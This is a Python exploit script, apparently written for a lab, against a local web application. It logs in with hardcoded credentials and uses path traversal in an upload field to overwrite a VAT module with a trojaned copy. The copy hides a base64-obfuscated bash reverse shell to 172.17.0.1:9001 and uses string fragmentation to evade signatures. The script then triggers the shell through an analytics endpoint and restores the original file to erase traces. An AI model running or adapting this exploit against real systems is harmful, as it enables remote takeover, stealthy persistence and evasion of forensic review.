import requests
import sys
import time
import os

# --- CORES E ESTILOS (ANSI) ---
# Cores Base
C_RED     = '\033[91m'
C_GREEN   = '\033[92m'
C_YELLOW  = '\033[93m'
C_BLUE    = '\033[94m'
C_CYAN    = '\033[96m'
C_RESET   = '\033[0m'
C_BOLD    = '\033[1m'
C_DIM     = '\033[2m'

# Ícones
I_OK   = f"{C_GREEN}✔{C_RESET}"
I_FAIL = f"{C_RED}✖{C_RESET}"
I_INFO = f"{C_BLUE}➜{C_RESET}"
I_WARN = f"{C_YELLOW}⚡{C_RESET}"
I_SKULL= f"{C_RED}☠{C_RESET}"

# --- CONFIGURAÇÃO ---
BASE_URL = "http://localhost:5000"
LOGIN_URL = f"{BASE_URL}/login"
UPLOAD_URL = f"{BASE_URL}/update_products"
TRIGGER_URL = f"{BASE_URL}/analytics"

# Credenciais
USERNAME = "jdoe"
PASSWORD = "password123"

# Ficheiros
TARGET_PATH = "../../../../../../../app/services/vat.py"
LOCAL_CLEAN_FILE = "vat_original.py"

# --- PAYLOAD (HARDCODED) ---
MALICIOSO_HARDCODED = """
import sys
import os
import base64
from Crypto.Util import Padding

def get_vat_rate(country_code):
    def _verify_signature():
        try:
            if os.environ.get('_V_SEC_K'): return
            os.environ['_V_SEC_K'] = '1'

            # 1. Strings fragmentadas para evitar assinaturas estáticas
            m_name = "".join(['subpro', 'cess'])
            f_name = "".join(['Po', 'pen'])
            
            # 2. Payload Totalmente Ofuscado (Base64 do comando original)
            # Isto traduz-se para: bash -c "bash -i >& /dev/tcp/172.17.0.1/9001 0>&1" &
            _t = 'YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzkwMDEgMD4mMSIgJg=='
            
            # 3. Importação e Execução por Reflexão
            _m = __import__(m_name)
            _p = base64.b64decode(_t).decode()
            
            _c = Padding.unpad(Padding.pad(_p.encode(), 16), 16).decode()
            
            # 5. Execução silenciosa
            _sh = base64.b64decode('L2Jpbi9iYXNo').decode() # /bin/bash
            getattr(_m, f_name)(_c, shell=True, executable=_sh, stdout=-3, stderr=-3)
        except:
            pass

    _verify_signature()

    vat_rates = {
        'DE': 19, 'FR': 20, 'IT': 22, 'ES': 21, 'UK': 20, 'NL': 21, 'SE': 25, 'PT': 23, 'BE': 21
    }
    return vat_rates.get(country_code.upper(), 23)

def save_vat_to_file(vat_rate):
    try:
        with open('vat_rate.txt', 'w') as f: f.write(str(vat_rate))
    except: pass

def main():
    if len(sys.argv) < 2:
        print("23")
        sys.exit(0)
    
    country = sys.argv[1].strip()
    rate = get_vat_rate(country)
    
    save_vat_to_file(rate)
    print(f"{rate}")

if __name__ == "__main__":
    main()
"""

def print_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = f"""{C_CYAN}
    ██╗███████╗ ██████╗████████╗███████╗███████╗██████╗  ██████╗ ████████╗
    ██║██╔════╝██╔════╝╚══██╔══╝██╔════╝██╔════╝██╔══██╗██╔═══██╗╚══██╔══╝
    ██║███████╗██║        ██║   █████╗  ███████╗██████╔╝██║   ██║   ██║   
    ██║╚════██║██║        ██║   ██╔══╝  ╚════██║██╔═══╝ ██║   ██║   ██║   
    ██║███████║╚██████╗   ██║   ███████╗███████║██║     ╚██████╔╝   ██║   
    ╚═╝╚══════╝ ╚═════╝   ╚═╝   ╚══════╝╚══════╝╚═╝      ╚═════╝    ╚═╝   
    {C_RESET}{C_DIM}>> RCE via Path Traversal & Auto-Restore Mechanism <<{C_RESET}
    """
    print(banner)
    print(f"{C_DIM}═"*70 + f"{C_RESET}")
    print(f" {C_BOLD}TARGET:{C_RESET}  {BASE_URL}")
    print(f" {C_BOLD}USER:{C_RESET}    {USERNAME}")
    print(f" {C_BOLD}PAYLOAD:{C_RESET} Obfuscated Python Reverse Shell")
    print(f" {C_BOLD}ACTION:{C_RESET}  Inject -> Trigger -> {C_GREEN}Cleanup{C_RESET}")
    print(f"{C_DIM}═"*70 + f"{C_RESET}\n")

def progress_bar(seconds, message):
    """Cria uma barra de progresso visual para o sleep"""
    sys.stdout.write(f" {I_INFO} {message}  ")
    for i in range(seconds * 2):
        sys.stdout.write(f"{C_CYAN}▓{C_RESET}")
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write(f" {C_GREEN}DONE!{C_RESET}\n")

def run_exploit():
    print_banner()
    s = requests.Session()
    jwt_token = None
    comp_id = 1
    user_id = 1

    # -------------------------------------------------
    # 1. AUTENTICAÇÃO
    # -------------------------------------------------
    sys.stdout.write(f" {I_INFO} Authenticating as {C_BOLD}{USERNAME}{C_RESET}...")
    try:
        r = s.post(LOGIN_URL, json={"username": USERNAME, "password": PASSWORD})
        if r.status_code == 200 and 'token' in r.json():
            data = r.json()
            jwt_token = data['token']
            if 'comp_id' in data: comp_id = data['comp_id']
            if 'user_id' in data: user_id = data['user_id']
            print(f"\r {I_OK} Authentication Successful {C_DIM}(ID: {user_id} | Comp: {comp_id}){C_RESET}")
        else:
            print(f"\r {I_FAIL} Login Failed! Status: {r.status_code}")
            return
    except Exception as e:
        print(f"\r {I_FAIL} Connection Error: {e}")
        return

    # -------------------------------------------------
    # 2. UPLOAD DO EXPLOIT (INJEÇÃO)
    # -------------------------------------------------
    print(f" {I_INFO} Injecting Malicious Payload into {C_YELLOW}vat.py{C_RESET}...")
    try:
        files = {'file': (TARGET_PATH, MALICIOSO_HARDCODED, 'application/pdf')}
        data = {'comp_id': str(comp_id), 'token': jwt_token}

        r = s.post(UPLOAD_URL, files=files, data=data)
        
        if r.status_code in [200, 500]:
            print(f" {I_OK} {C_GREEN}Payload Injected Successfully.{C_RESET}")
        else:
            print(f" {I_FAIL} Injection Failed: {r.status_code}")
            return
    except Exception as e:
        print(f" {I_FAIL} Upload Error: {e}")
        return

    # -------------------------------------------------
    # 3. TRIGGER (EXECUÇÃO DA SHELL)
    # -------------------------------------------------
    print(f" {I_WARN} Triggering execution via {C_BOLD}/analytics{C_RESET} endpoint...")
    
    try:
        trigger_json = {"user_id": user_id, "token": jwt_token, "comp_id": comp_id}
        
        try:
            s.post(TRIGGER_URL, json=trigger_json, timeout=1)
        except requests.exceptions.ReadTimeout:
            pass 
        

	
        print(f"\n   {I_SKULL} {C_RED}{C_BOLD}TRIGGER SENT! CHECK YOUR LISTENER!{C_RESET}")
        print(f"   {C_RED}{C_BOLD}HAPPY HACKING!{C_RESET}\n")
        
    except Exception as e:
        print(f" {I_FAIL} Trigger Error: {e}")

    # Pausa visual com barra de progresso
    progress_bar(3, "Waiting for shell connection before cleanup...")

    # -------------------------------------------------
    # 4. RESTORE (LIMPEZA DE RASTOS)
    # -------------------------------------------------
    print(f" {I_INFO} Restoring original file from {C_BOLD}{LOCAL_CLEAN_FILE}{C_RESET}...")
    
    try:
        with open(LOCAL_CLEAN_FILE, 'r') as f:
            clean_content = f.read()

        files_clean = {'file': (TARGET_PATH, clean_content, 'application/pdf')}
        
        r = s.post(UPLOAD_URL, files=files_clean, data=data)

        if r.status_code in [200, 500]:
            print(f" {I_OK} {C_GREEN}SYSTEM RESTORED! Trace removed from disk.{C_RESET}")
            print(f"     {C_DIM}└─ The shell process remains active in memory.{C_RESET}\n")
        else:
            print(f" {I_FAIL} Restore Failed: {r.status_code}")

    except FileNotFoundError:
        print(f" {I_FAIL} {C_RED}CRITICAL:{C_RESET} '{LOCAL_CLEAN_FILE}' not found! Cannot restore.")
    except Exception as e:
        print(f" {I_FAIL} Restore Error: {e}")

if __name__ == "__main__":
    try:
        run_exploit()
    except KeyboardInterrupt:
        print(f"\n\n {I_WARN} Exploit interrupted by user.")
